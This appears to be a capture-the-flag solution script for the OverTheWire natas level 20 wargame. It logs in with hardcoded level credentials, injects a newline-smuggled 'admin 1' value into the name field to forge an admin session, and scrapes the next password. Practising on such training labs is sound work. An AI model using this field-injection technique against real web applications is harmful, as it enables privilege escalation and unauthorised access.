import requests
import re

username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

url = 'http://%s.natas.labs.overthewire.org?debug=1' % username

with open('natas20.html', 'w+') as out:
    session = requests.Session()
    res = session.post(url, auth=(username, password),
                       data={'name': 'test\nadmin 1'})
    content = res.text
    out.write(content)
    res = session.get(url, auth=(username, password))
    content = res.text
    out.write(content)
    flag = re.findall('Password: (.+?)</pre>',content)[0]
    print(flag)
